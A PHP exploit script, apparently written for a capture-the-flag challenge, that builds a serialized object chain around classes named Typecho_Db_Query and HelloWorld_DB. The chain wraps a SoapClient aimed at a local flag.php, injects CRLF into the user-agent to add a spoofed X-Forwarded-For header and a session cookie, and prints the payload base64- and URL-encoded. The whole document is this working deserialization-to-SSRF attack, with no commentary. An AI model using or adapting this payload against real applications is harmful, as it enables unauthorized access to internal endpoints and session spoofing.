#exp.php
<?php
error_reporting(0);
class HelloWorld_DB{
    private $coincidence;
    public function __construct()
    {
        $this->coincidence = array("hello" => new Typecho_Db_Query());
    }
}

class Typecho_Db_Query
{
    private $_adapter;
    private $_sqlPreBuild;
    public function __construct()
    {
        $target = "http://127.0.0.1/flag.php";
        $this->_adapter = new SoapClient(null, array(
            'location' => $target,
            'user_agent' => "kenoe\r\nX-Forwarded-For:127.0.0.1\r\nCookie: PHPSESSID=g5u1kjdqmenl4e3hvae8l7atf3",
            'uri' => 'exp'
            )
        );
        $this->_sqlPreBuild = ['action' => "SELECT"];
    }
}
$a = serialize(new HelloWorld_DB());
echo urlencode(base64_encode($a));
?>